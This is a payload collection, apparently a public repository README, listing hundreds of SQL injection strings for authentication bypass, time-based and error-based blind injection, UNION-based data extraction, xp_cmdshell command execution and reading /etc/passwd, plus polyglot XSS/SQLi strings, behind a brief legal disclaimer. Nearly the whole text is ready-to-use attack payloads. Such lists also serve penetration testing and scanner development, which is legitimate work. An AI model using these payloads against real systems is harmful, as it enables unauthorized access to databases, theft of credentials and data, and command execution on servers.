# SQL Injection Payloads

By <b>Kevin Mora</b>, under the GNU GENERAL PUBLIC LICENSE Version 3.0, July 2021.

Disclaimer: Execution of these commands for attacking websites without the owner's permission is illegal. The developer is not responsible for any damage or dispairment caused by this.

---

A SQL Injection attack consists of the insertion or injection of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.

##  Auth Bypass – Payload
```sql
%7C
%27
//*
||'6
*/*
%27
%%2727
%25%27
`+HERP
" / %22
; / %3B
" / %22
; / %3B
'||'DERP
'+'herp
' ' DERP

-- or # 
' or "
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
" or "x"="x
') or ('x')=('x
") or ("x")=("x
')) or (('x'))=(('x
")) or (("x"))=(("x

or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 0=0 #"
' or 1=1
' or 0=0 #
' or 1=1--
' or 1 --'
' or a=a--
' or 0=0 --
 or 1=1 --
' or '1'='1'--
' or 1=1 or ''='
or 1=1 or ""=
') or ('a'='a

' OR '' = '
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
 OR 1/*
 
1*56
-2
'='
%00
1-false
1-true
'LIKE'
'=0--+
OR 1=1
AND 1
AND 0
AND true
AND false
' OR 'x'='x
'hi' or 'x'='x';
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
' GROUP BY columnnames having 1=1 --

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+

admin' --
admin' #
admin'/*
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin' or '1'='1
admin'or 1=1 or ''='
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*```
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
' AND (select 1 from admin limit 0,1)=1
' AND (select 1 from users limit 0,1)=1
```

## Time Based – Payload
```mysql
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='

pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#

waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#

;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--

benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
+benchmark(3200,SHA1(1))+'

(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--

AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#

+ SLEEP(10) + '
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Error Based – Payload
```mysql
OR 1=1
OR 1=0
OR x=x
OR x=y
OR 1=1#
OR 1=0#
OR x=x#
OR x=y#
OR 1=1-- 
OR 1=0-- OR x=x-- OR x=y-- HAVING 1=1HAVING 1=0HAVING 1=1#HAVING 1=0#HAVING 1=1-- HAVING 1=0-- AND 1=1AND 1=0AND 1=1-- AND 1=0-- AND 1=1#AND 1=0#AND 1=1 AND '%'='AND 1=0 AND '%'='
OR 3409=3409 AND ('pytW' LIKE 'pytW
OR 3409=3409 AND ('pytW' LIKE 'pytY

AND 1083=1083 AND (1427=1427
AND 7506=9091 AND (5913=5913
AND 1083=1083 AND ('1427=1427
AND 7506=9091 AND ('5913=5913
AND 7300=7300 AND 'pKlZ'='pKlZ
AND 7300=7300 AND 'pKlZ'='pKlY
AND 7300=7300 AND ('pKlZ'='pKlZ
AND 7300=7300 AND ('pKlZ'='pKlY
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='

AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=0
AS INJECTX WHERE 1=1 AND 1=1#
AS INJECTX WHERE 1=1 AND 1=0#
AS INJECTX WHERE 1=1 AND 1=1--
AS INJECTX WHERE 1=1 AND 1=0--

WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=1--WHERE 1=1 AND 1=0--

ORDER BY (N--)
ORDER BY (N#) 
ORDER BY (N)

RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
```

### Request Based – Payload
```mysql
' or username like '%
' or uname like '%
' or userid like '%
' or uid like '%
' or user like '%

username=victim&password=Blah%27%20OR%201%3D%271
username=victim&password=Blah%27%20OR%201%3D%271
username=victim&password=%5C%27%27%20or%201%3D1%20%23
username=victim&password=%C3%B5tM%C2%B8%C2%A6%C3%A9%C3%8F8%C3%9B%C3%BBl%0CT%27%3D%27

1' AND 1=2 UNION SELECT 1, DATABASE(), 2 #
1' AND 1=2 UNION SELECT 1, @@version, 2 #
1' AND 1=2 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables where table_schema=database() #
1' AND 1=2 UNION SELECT 1, group_concat(secret), group_concat(id) FROM SECRETTABLE #

'||UTL_HTTP.REQUEST
1;SELECT%20*
to_timestamp_tz
tz_offset
&lt;&gt;&quot;'%;)(&amp;+
'%20or%201=1
%27%20or%201=1
%20$(sleep%2050)
%20'sleep%2050'
char%4039%41%2b%40SELECT
&apos;%20OR
%2A%7C
'sqlattempt1
(sqlattempt2)
*(|(mail=*))
%2A%28%7C%28mail%3D%2A%29%29
*(|(objectclass=*))
%2A%28%7C%28objectclass%3D%2A%29%29

exec xp
exec sp
'; exec master..xp_cmdshell
'; exec xp_regread
t'exec master..xp_cmdshell 'nslookup www.google.com'--
--sp_password

\x27UNION SELECT
' UNION SELECT
' UNION ALL SELECT
' or (EXISTS)
' (select top 1
x' OR full_name LIKE '%Bob%
; execute immediate 'sel' || 'ect us' || 'er'
'; exec master..xp_cmdshell 'ping 172.10.1.255'--

'%20or%20''='
'%20or%20'x'='x
')%20or%20('x'='x
)%20or%20('x'='x
%20or%201=1

benchmark(10000000,MD5(1))#
";waitfor delay '0:0:__TIME__'--
1) or pg_sleep(__TIME__)--
||(elt(-3+5,bin(15),ord(10),hex(char(45))))
"hi"") or (""a""=""a"
" or sleep(__TIME__)#
pg_sleep(__TIME__)--
*(|(objectclass=*))
declare @q nvarchar (200) 0x730065006c00650063 ...
 or 0=0 #
1) or sleep(__TIME__)#
) or ('a'='a
; exec xp_regread
@var select @var as var into temp end --
1)) or benchmark(10000000,MD5(1))#
(||6)
"a"" or 3=3--"
" or benchmark(10000000,MD5(1))#
# from wapiti
 or 0=0 --
1 waitfor delay '0:0:10'--
 or 'a'='a
hi or 1=1 --"
or a = a
) or sleep(__TIME__)='
)) or benchmark(10000000,MD5(1))#
hi' or 'a'='a
21 %
 or 1=1
 or 2 > 1
")) or benchmark(10000000,MD5(1))#
hi') or ('a'='a
 or 3=3
));waitfor delay '0:0:__TIME__'--
a' waitfor delay '0:0:10'--
1;(load_file(char(47,101,116,99,47,112,97,115, ...
or%201=1
1 or sleep(__TIME__)#
or 1=1
 and 1 in (select var from temp)--
 or '7659'='7659
 or 'text' = n'text'
 or 1=1 or ''='
 
declare @s varchar (200) select @s = 0x73656c6 ...
exec xp
; exec master..xp_cmdshell 'ping 172.10.1.255'--
3.10E+17
" or pg_sleep(__TIME__)--
x' AND email IS NULL; --
 or 'unusual' = 'unusual'
1) or benchmark(10000000,MD5(1))#
\x27UNION SELECT
declare @s varchar(200) select @s = 0x77616974 ...
tz_offset
sqlvuln
"));waitfor delay '0:0:__TIME__'--
or%201=1 --
%2A%28%7C%28objectclass%3D%2A%29%29
or a=a
) union select * from information_schema.tables;
PRINT @@variable
or isNULL(1/0) /*
26 %
" or "a"="a
(sqlvuln)
x' AND members.email IS NULL; --
 and 1=( if((load_file(char(110,46,101,120,11 ...
0x770061006900740066006F0072002000640065006C00 ...
%20'sleep%2050'
as
1)) or pg_sleep(__TIME__)--
/**/or/**/1/**/=/**/1
 union all select @@version--
,@variable
(sqlattempt2)
 or (EXISTS)
t'exec master..xp_cmdshell 'nslookup www.googl ...
%20$(sleep%2050)
1 or benchmark(10000000,MD5(1))#
%20or%20''='
||UTL_HTTP.REQUEST
 or pg_sleep(__TIME__)--
hi' or 'x'='x';
") or sleep(__TIME__)="
 or 'whatever' in ('whatever')
; begin declare @var varchar(8000) set @var=' ...
 union select 1,load_file('/etc/passwd'),1,1,1;
0x77616974666F722064656C61792027303A303A313027 ...
exec(@s)
) or pg_sleep(__TIME__)--
 union select
 or sleep(__TIME__)#
 select * from information_schema.tables--
a' or 1=1--
a' or 'a' = 'a
declare @s varchar(22) select @s =
 or 2 between 1 and 3
 or a=a--
 or '1'='1
 or sleep(__TIME__)='
 or 1 --'
or 0=0 #"
having
a'
" or isNULL(1/0) /*
declare @s varchar (8000) select @s = 0x73656c ...
â or 1=1 --
char%4039%41%2b%40SELECT
 having 1=1--
) or benchmark(10000000,MD5(1))#
 or username like char(37);
;waitfor delay '0:0:__TIME__'--
" or 1=1--
x' AND userid IS NULL; --
 or 'text' > 't'
 (select top 1
 or benchmark(10000000,MD5(1))#
");waitfor delay '0:0:__TIME__'--
a' or 3=3--
 -- &password=
 group by userid having 1=1--
 or ''='
; exec master..xp_cmdshell
%20or%20x=x
")) or sleep(__TIME__)="
0x730065006c0065006300740020004000400076006500 ...
hi' or 1=1 --
") or pg_sleep(__TIME__)--
%20or%20'x'='x
 or 'something' = 'some'+'thing'
exec sp
29 %
Ã½ or 1=1 --
1 or pg_sleep(__TIME__)--
0 or 1=1
) or (a=a
uni/**/on sel/**/ect
replace
%27%20or%201=1
)) or pg_sleep(__TIME__)--
%7C
x' AND 1=(SELECT COUNT(*) FROM tabname); --
&apos;%20OR
; or '1'='1'
declare @q nvarchar (200) select @q = 0x770061 ...
1 or 1=1
; exec ('sel' + 'ect us' + 'er')
23 OR 1=1
anything' OR 'x'='x
declare @q nvarchar (4000) select @q =
or 0=0 --
1)) or sleep(__TIME__)#
or 0=0 #
 select name from syscolumns where id = (sele ...
hi or a=a
*(|(mail=*))
password:*/=1--
distinct
);waitfor delay '0:0:__TIME__'--
to_timestamp_tz
") or benchmark(10000000,MD5(1))#
 UNION SELECT
%2A%28%7C%28mail%3D%2A%29%29
+sqlvuln
 or 1=1 /*
)) or sleep(__TIME__)='
or 1=1 or ""=
 or 1 in (select @@version)--
sqlvuln;
 union select * from users where login = char ...
x' or 1=1 or 'x'='y
28 %
â or 3=3 --
@variable
 or '1'='1'--
"a"" or 1=1--"
%2A%7C
" or 0=0 --
")) or pg_sleep(__TIME__)--

declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
```

## Are you in yet?
```mysql
' OR '' = '

">/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/<iframe/>

IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/

/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*////*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/</style>\x3ciframe/<iframe onload="alert(document.cookies)//">\x3e--!><iframe src="">/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/<iframe/>

/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*////*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/</style>\x3ciframe/<iframe onload="alert(document.cookies)//">\x3e--!><iframe src="

/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</style>\x3ciframe/<iframe onload="alert(document.cookies)//">\x3e--!><iframe src=""><iframe/>
```
